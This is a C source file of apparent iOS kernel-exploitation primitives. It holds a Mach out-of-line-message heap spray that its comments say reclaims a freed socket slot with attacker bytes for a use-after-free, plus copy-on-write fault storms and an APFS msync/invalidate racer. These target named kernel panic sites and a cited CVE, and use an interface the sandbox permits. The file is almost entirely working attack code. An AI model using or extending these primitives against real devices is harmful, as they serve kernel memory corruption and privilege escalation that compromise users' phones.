// Cross-zone reclaim spray for the socket-UAF harness.
// Sends MACH_MSG_OOL_DESCRIPTOR messages with MACH_MSG_VIRTUAL_COPY so the
// kernel copies the payload into fresh kernel memory. Deliberately *not*
// sockets, so a freed socket slot reclaimed this way holds attacker bytes.

#include <mach/mach.h>
#include <mach/message.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define SOCKUAF_MAX_PORTS 1024

static mach_port_t sockuaf_ports[SOCKUAF_MAX_PORTS];
static int sockuaf_port_count;

void sockuaf_ool_reset(void) { sockuaf_port_count = 0; }

int sockuaf_ool_count(void) { return sockuaf_port_count; }

int sockuaf_ool_spray(size_t size, int count, uint64_t fill)
{
    if (count > SOCKUAF_MAX_PORTS - sockuaf_port_count)
        count = SOCKUAF_MAX_PORTS - sockuaf_port_count;
    if (count <= 0 || size == 0)
        return 0;

    uint8_t *buf = malloc(size);
    if (!buf)
        return 0;
    for (size_t i = 0; i < size; i += 8) {
        uint64_t v = fill;
        size_t n = size - i < 8 ? size - i : 8;
        memcpy(buf + i, &v, n);
    }

    int made = 0;
    for (int i = 0; i < count; i++) {
        mach_port_t port = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS)
            break;
        if (mach_port_insert_right(mach_task_self(), port, port,
                                   MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }

        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t desc;
        } msg;
        memset(&msg, 0, sizeof(msg));
        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.header.msgh_id = 0x4f4f5343;
        msg.body.msgh_descriptor_count = 1;
        msg.desc.address = buf;
        msg.desc.size = (mach_msg_size_t)size;
        msg.desc.deallocate = 0;
        msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
        msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;

        kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0,
                                    MACH_PORT_NULL, 0, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }
        sockuaf_ports[sockuaf_port_count++] = port;
        made++;
    }
    free(buf);
    return made;
}

/* ---- CoW / external-object fault storm (see analysis/krw-leads/CVE-2026-112576-cow.md) ---- */
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

typedef struct {
    uint8_t *base;
    uint64_t size;
    volatile int go;
} cow_thread_arg_t;

static void *cow_writer(void *p)
{
    cow_thread_arg_t *a = (cow_thread_arg_t *)p;
    while (!a->go) { }
    uint64_t pages = (a->size + 4095) / 4096;
    for (uint64_t i = 0; i < pages; i++) {
        a->base[i * 4096] ^= (uint8_t)(i & 0xff);
    }
    return NULL;
}


/* File-backed MAP_PRIVATE CoW storm: exercises the same vm_fault_page() CoW branch
   but through an interface the iOS sandbox permits. */
typedef struct {
    uint8_t *priv;
    uint8_t *shr;
    uint64_t size;
    volatile int go;
} cowf_arg_t;

static void *cowf_writer(void *p)
{
    cowf_arg_t *a = (cowf_arg_t *)p;
    while (!a->go) { }
    uint64_t pages = (a->size + 4095) / 4096;
    for (uint64_t i = 0; i < pages; i++) {
        a->priv[i * 4096] ^= (uint8_t)(i & 0xff);
        if (a->shr) {
            a->shr[i * 4096] += 1;
        }
    }
    return NULL;
}

/* stages: [0]=open/ftruncate [1]=mmap_private [2]=mmap_shared [3]=threads */
int cow_file_probe(int rounds, int size_kb, const char *dir, int *stages)
{
    int first_err = 0;
    char path[512];

    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
        snprintf(path, sizeof(path), "%s/cowprobe_%d.bin", dir, r);
        int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
        if (fd < 0 || ftruncate(fd, (off_t)size) != 0) {
            stages[0]++;
            if (fd >= 0) close(fd);
            continue;
        }

        uint8_t *priv = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
        if (priv == MAP_FAILED) {
            stages[1]++;
            close(fd);
            continue;
        }

        uint8_t *shr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

        cowf_arg_t t1 = { priv, shr, size, 0 };
        cowf_arg_t t2 = { priv, NULL, size, 0 };
        pthread_t th1, th2;
        if (pthread_create(&th1, NULL, cowf_writer, &t1) == 0 &&
            pthread_create(&th2, NULL, cowf_writer, &t2) == 0) {
            t1.go = 1; t2.go = 1;
            pthread_join(th1, NULL); pthread_join(th2, NULL);
        } else {
            stages[3]++;
        }

        if (shr && shr != MAP_FAILED) munmap(shr, size);
        munmap(priv, size);
        close(fd);
        unlink(path);
    }
    return first_err;
}


/* ---- APFS msync / invalidate racer ------------------------------------------
   Targets the error-path panics in apfs_vnops.c that 27.2 removed:
     "%s:%d: %s Failed to msync for ino %llu"          (site 0xfffffe000a9ac0f0)
     "%s:%d: %s Failed to invalidate %llu:%llu for ino" (site 0xfffffe000a9ac62c)
   Strategy: dirty a large shared mapping, then concurrently msync, madvise,
   ftruncate and remap it so the APFS invalidation paths race hard. */
typedef struct {
    uint8_t *base;
    int fd;
    uint64_t size;
    volatile int go;
} apfs_arg_t;

static void *apfs_writer(void *p)
{
    apfs_arg_t *a = (apfs_arg_t *)p;
    while (!a->go) { }
    /* bounded: pthread_cancel has no cancellation point in a pure memory loop */
    for (int i = 0; i < 200000; i++) {
        uint64_t off = (uint64_t)(rand() % 64) * 4096;
        if (off < a->size) {
            a->base[off] ^= (uint8_t)off;
        }
    }
    return NULL;
}

static void *apfs_syncer(void *p)
{
    apfs_arg_t *a = (apfs_arg_t *)p;
    while (!a->go) { }
    for (int i = 0; i < 4000; i++) {
        if (a->size < 8192) break;
        uint64_t chunk = 4096u * (uint64_t)(1 + (rand() % 32));
        uint64_t start = (uint64_t)(rand() % 64) * 4096;
        if (start >= a->size) start = 0;
        msync(a->base + start, chunk, (i & 1) ? MS_SYNC : MS_ASYNC);
        if (i % 8 == 0) {
            madvise(a->base + start, chunk, MADV_DONTNEED);
        }
        if (i % 64 == 0) {
            fsync(a->fd);
        }
    }
    return NULL;
}

/* stages: [0]=open/ftruncate [1]=mmap [2]=thread create */
int apfs_race_probe(int rounds, int size_kb, const char *dir, int *stages)
{
    char path[512];
    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * 1024u;
        snprintf(path, sizeof(path), "%s/apfsrace_%d.bin", dir, r);
        int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
        if (fd < 0 || ftruncate(fd, (off_t)size) != 0) {
            stages[0]++;
            if (fd >= 0) close(fd);
            continue;
        }
        uint8_t *base = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if (base == MAP_FAILED) {
            stages[1]++;
            close(fd);
            continue;
        }
        /* dirty every page so there is real state to invalidate */
        memset(base, 0x5a, size);

        apfs_arg_t w = { base, fd, size, 0 };
        apfs_arg_t sy = { base, fd, size, 0 };
        pthread_t tw, tsy;
        int ok = 1;
        if (pthread_create(&tw, NULL, apfs_writer, &w) != 0) ok = 0;
        if (pthread_create(&tsy, NULL, apfs_syncer, &sy) != 0) ok = 0;
        if (ok) {
            w.go = 1; sy.go = 1;
            pthread_join(tsy, NULL);
            pthread_join(tw, NULL);
        } else {
            stages[2]++;
        }

        munmap(base, size);
        /* invalidation cycle after unmapping: ftruncate cannot SIGBUS here */
        for (int k = 0; k < 8; k++) {
            if (ftruncate(fd, 0) == 0) {
                fsync(fd);
                ftruncate(fd, (off_t)size);
                fsync(fd);
            }
        }
        close(fd);
        unlink(path);
    }
    return 0;
}

/* stages: [0]=make_entry [1]=map1 [2]=map2 [3]=allocate [4]=copy [5]=thread */
int cow_probe_run(int rounds, int size_kb, int *stages)
{
    int first_kr = 0;
    vm_map_t self = mach_task_self();

    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
        mach_port_t entry = MACH_PORT_NULL;

        kern_return_t kr = mach_make_memory_entry_64(
            self, &size, 0,
            VM_PROT_READ | VM_PROT_WRITE,
            &entry, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            stages[0]++;
            if (!first_kr) first_kr = (int)kr;
            continue;
        }

        vm_address_t a1 = 0;
        kr = vm_map(self, &a1, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            stages[1]++;
            if (!first_kr) first_kr = (int)kr;
            mach_port_deallocate(self, entry);
            continue;
        }
        memset((void *)a1, 0x5a, size);

        vm_address_t a2 = 0;
        kr = vm_map(self, &a2, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            stages[2]++;
            if (!first_kr) first_kr = (int)kr;
            vm_deallocate(self, a1, (vm_size_t)size);
            mach_port_deallocate(self, entry);
            continue;
        }

        vm_address_t a3 = 0;
        if (vm_allocate(self, &a3, (vm_size_t)size, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
            kr = vm_copy(self, a1, (vm_size_t)size, a3);
            if (kr != KERN_SUCCESS) {
                stages[4]++;
                if (!first_kr) first_kr = (int)kr;
            }
        } else {
            stages[3]++;
            if (!first_kr) first_kr = (int)kr;
        }

        cow_thread_arg_t t1 = { (uint8_t *)a1, size, 0 };
        cow_thread_arg_t t2 = { (uint8_t *)a2, size, 0 };
        pthread_t th1, th2;
        if (pthread_create(&th1, NULL, cow_writer, &t1) == 0 &&
            pthread_create(&th2, NULL, cow_writer, &t2) == 0) {
            t1.go = 1; t2.go = 1;
            pthread_join(th1, NULL); pthread_join(th2, NULL);
        } else {
            stages[5]++;
        }

        vm_deallocate(self, a1, (vm_size_t)size);
        vm_deallocate(self, a2, (vm_size_t)size);
        if (a3) vm_deallocate(self, a3, (vm_size_t)size);
        mach_port_deallocate(self, entry);
    }
    return first_kr;
}
